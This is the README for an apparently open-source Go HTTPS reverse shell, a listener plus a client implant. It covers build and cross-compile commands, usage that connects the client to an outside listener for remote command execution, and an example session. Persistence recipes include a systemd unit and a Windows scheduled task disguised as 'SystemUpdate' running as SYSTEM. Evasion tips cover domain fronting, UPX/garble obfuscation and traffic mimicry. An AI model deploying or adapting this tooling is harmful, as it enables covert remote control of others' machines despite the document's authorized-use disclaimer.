# Golang HTTPS Reverse Shell

A secure, encrypted reverse shell implementation using HTTPS/TLS in Go. This project consists of two components: a listener (server) and a reverse shell client that communicate over encrypted HTTPS connections.

## ⚠️ Legal Disclaimer

**IMPORTANT**: This tool is provided for educational purposes and authorized security testing only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before using this tool. The authors are not responsible for misuse or damage caused by this program.

## 🔐 Features

### Listener (Server)
- **Automatic TLS Certificate Generation**: Creates self-signed certificates on-the-fly
- **Multi-Client Support**: Handle multiple reverse shell connections simultaneously
- **Interactive Shell Interface**: Metasploit-style interface for managing connections
- **Session Management**: Background and foreground client sessions
- **Connection Persistence**: Maintains long-lived connections with keepalive pings
- **Secure Communication**: All traffic encrypted via HTTPS/TLS 1.2+

### Reverse Shell (Client)
- **Cross-Platform**: Works on Windows, Linux, and macOS
- **Auto-Reconnect**: Exponential backoff retry mechanism
- **Command Execution**: Execute shell commands and return output
- **System Information**: Automatically gathers system details on connection
- **TLS Certificate Bypass**: Accepts self-signed certificates
- **Stealth Operation**: Minimal network footprint

## 📋 Requirements

- Go 1.16 or higher
- Network connectivity between client and server
- Firewall rules allowing the designated port

## 🚀 Installation

### Clone the Repository

```bash
git clone https://github.com/frjcomp/golang-https-rev.git
cd golang-https-rev
```

### Build the Listener

```bash
# Build for your current platform
go build -o listener listener.go

# Or build for a specific platform
GOOS=linux GOARCH=amd64 go build -o listener-linux listener.go
GOOS=windows GOARCH=amd64 go build -o listener.exe listener.go
GOOS=darwin GOARCH=amd64 go build -o listener-mac listener.go
```

### Build the Reverse Shell Client

```bash
# Build for your current platform
go build -o reverse reverse.go

# Cross-compile for different platforms
GOOS=linux GOARCH=amd64 go build -o reverse-linux reverse.go
GOOS=windows GOARCH=amd64 go build -o reverse.exe reverse.go
GOOS=darwin GOARCH=amd64 go build -o reverse-mac reverse.go

# Build for ARM (Raspberry Pi, Android, etc.)
GOOS=linux GOARCH=arm GOARM=7 go build -o reverse-arm reverse.go
```

## 📖 Usage

### Starting the Listener

```bash
# Basic usage
./listener <port> <network-interface>

# Examples
./listener 8443 0.0.0.0          # Listen on all interfaces
./listener 8443 192.168.1.100    # Listen on specific IP
./listener 443 0.0.0.0           # Use standard HTTPS port
```

### Connecting the Reverse Shell Client

```bash
# Basic usage
./reverse <host:port> <max-retries>

# Examples
./reverse 192.168.1.100:8443 0     # Infinite retry attempts
./reverse example.com:8443 5       # Maximum 5 retry attempts
./reverse 10.0.0.1:443 0          # Connect to standard HTTPS port
```

## 🎮 Interactive Commands

### Listener Commands

When running the listener, you have access to these commands:

```
listener> list                    # List all connected clients
listener> use <client_address>    # Interact with a specific client
listener> exit                    # Shutdown the listener
```

### Shell Session Commands

Once connected to a client:

```
shell[client_ip]> whoami          # Execute any shell command
shell[client_ip]> pwd             # Current working directory
shell[client_ip]> ls -la          # List files (Linux/Mac)
shell[client_ip]> dir             # List files (Windows)
shell[client_ip]> background      # Background the session
shell[client_ip]> exit            # Disconnect this client
```

## 💡 Example Session

### On the Listener Machine

```bash
$ ./listener 8443 0.0.0.0
2025/12/17 09:14:08 Generating self-signed certificate...
2025/12/17 09:14:08 Certificate generated successfully
2025/12/17 09:14:08 Starting HTTPS listener on 0.0.0.0:8443
2025/12/17 09:14:08 Listener ready. Waiting for connections...

=== Reverse Shell Listener ===
Commands:
  list                 - List connected clients
  use <client_id>      - Interact with a specific client
  exit                 - Exit the listener

listener> 
2025/12/17 09:15:23 [+] New client connected: 192.168.1.50:54321

listener> list

Connected Clients:
  1. 192.168.1.50:54321

listener> use 192.168.1.50:54321
Now interacting with: 192.168.1.50:54321
Type 'background' to return to listener prompt

shell[192.168.1.50:54321]> whoami
john

shell[192.168.1.50:54321]> pwd
/home/john

shell[192.168.1.50:54321]> uname -a
Linux target-host 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux

shell[192.168.1.50:54321]> background
Backgrounding session with 192.168.1.50:54321

listener> exit
Shutting down listener...
```

### On the Client Machine

```bash
$ ./reverse 192.168.1.100:8443 0
2025/12/17 09:15:23 Starting reverse shell client...
2025/12/17 09:15:23 Target: 192.168.1.100:8443
2025/12/17 09:15:23 Max retries: 0 (0 = infinite)
2025/12/17 09:15:23 Connecting to listener at https://192.168.1.100:8443/...
2025/12/17 09:15:23 Connected to listener successfully
2025/12/17 09:15:23 Received command: INFO
=== System Information ===
OS: linux
Arch: amd64
Hostname: target-host
Working Dir: /home/john
User: john
```

## 🏗️ Architecture

### Communication Flow

```
┌─────────────┐                    ┌─────────────┐
│             │   HTTPS/TLS 1.2+   │             │
│  Listener   │◄──────────────────►│   Reverse   │
│  (Server)   │   Self-Signed Cert │   Shell     │
│             │                    │  (Client)   │
└─────────────┘                    └─────────────┘
       │                                  │
       │ 1. Client connects               │
       │◄─────────────────────────────────┤
       │                                  │
       │ 2. Send INFO request             │
       ├─────────────────────────────────►│
       │                                  │
       │ 3. Receive system info           │
       │◄─────────────────────────────────┤
       │                                  │
       │ 4. Send shell command            │
       ├─────────────────────────────────►│
       │                                  │
       │ 5. Receive command output        │
       │◄─────────────────────────────────┤
       │                                  │
       │ 6. Keepalive PING every 30s      │
       ├─────────────────────────────────►│
```

### Key Components

**Listener (listener.go)**:
- HTTP/HTTPS server with TLS
- Connection hijacking for persistent bidirectional communication
- Concurrent goroutines for handling multiple clients
- Channel-based command/response routing
- Interactive CLI for session management

**Reverse Shell (reverse.go)**:
- HTTPS client with TLS verification disabled
- Command execution via OS-specific shells (cmd.exe/sh)
- Automatic reconnection with exponential backoff
- Output streaming back to listener

## 🔒 Security Considerations

### Encryption
- All communication is encrypted using TLS 1.2 or higher
- 2048-bit RSA keys for certificate generation
- Traffic appears as HTTPS, blending with normal web traffic

### Detection Risks
- Self-signed certificates may trigger warnings in network monitoring tools
- Long-lived HTTPS connections are unusual and may be flagged
- Command execution patterns can be detected by EDR solutions
- Network traffic analysis may identify command-and-control patterns

### Mitigation Recommendations
- Use legitimate certificates from Let's Encrypt or other CAs
- Implement domain fronting or CDN proxying
- Add jitter and randomization to connection timing
- Obfuscate binary with tools like UPX or garble
- Consider using protocol mimicry (e.g., legitimate HTTP headers)

## 🛠️ Advanced Usage

### Using with a Valid SSL Certificate

Modify `listener.go` to load your certificate:

```go
cert, err := tls.LoadX509KeyPair("server.crt", "server.key")
if err != nil {
    log.Fatalf("Failed to load certificate: %v", err)
}
```

### Building Static Binaries

```bash
# Linux static binary
CGO_ENABLED=0 GOOS=linux go build -a -ldflags '-extldflags "-static"' -o reverse-static reverse.go

# Reduce binary size
go build -ldflags="-s -w" -o reverse-small reverse.go
upx --best --lzma reverse-small
```

### Running as a Background Service

**Linux (systemd)**:

```bash
# Create service file: /etc/systemd/system/reverse-shell.service
[Unit]
Description=Reverse Shell Client
After=network.target

[Service]
Type=simple
User=nobody
ExecStart=/usr/local/bin/reverse 192.168.1.100:8443 0
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target

# Enable and start
sudo systemctl enable reverse-shell
sudo systemctl start reverse-shell
```

**Windows (Task Scheduler)**:

```powershell
# Run at startup
schtasks /create /tn "SystemUpdate" /tr "C:\\Windows\\Temp\\reverse.exe 192.168.1.100:8443 0" /sc onstart /ru SYSTEM
```

## 🐛 Troubleshooting

### Connection Issues

**Problem**: Client can't connect to listener
- Check firewall rules on both machines
- Verify the listener is running and binding to the correct interface
- Test connectivity with `telnet <host> <port>` or `curl -k https://<host>:<port>`

**Problem**: "TLS handshake error"
- Ensure client is using `InsecureSkipVerify: true`
- Check that TLS versions are compatible

### Command Execution Issues

**Problem**: Commands hang or don't return output
- Some commands may require interactive input (use non-interactive alternatives)
- Try redirecting stderr: `command 2>&1`
- Increase timeout values in the code

### Building Issues

**Problem**: "undefined: http.Hijacker"
- Ensure you're using Go 1.16 or higher
- Update dependencies: `go mod tidy`

## 📊 Performance

- **Memory Usage**: ~10-20 MB per listener instance, ~5-10 MB per client
- **CPU Usage**: Minimal when idle, depends on command execution
- **Network Overhead**: TLS adds ~5-10% overhead compared to plaintext
- **Max Connections**: Limited by OS file descriptors (typically 1024+ concurrent clients)

## 🤝 Contributing

Contributions are welcome! Please:

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

## 📄 License

This project is provided as-is for educational purposes. Use responsibly and legally.

## 🙏 Acknowledgments

- Inspired by various reverse shell implementations in the security community
- Built with Go's excellent standard library
- TLS implementation based on Go's crypto/tls package

## 📞 Contact

- GitHub: [@frjcomp](https://github.com/frjcomp)
- Repository: [golang-https-rev](https://github.com/frjcomp/golang-https-rev)

---

**Remember**: Always use this tool ethically and legally. Obtain proper authorization before testing any systems you don't own.
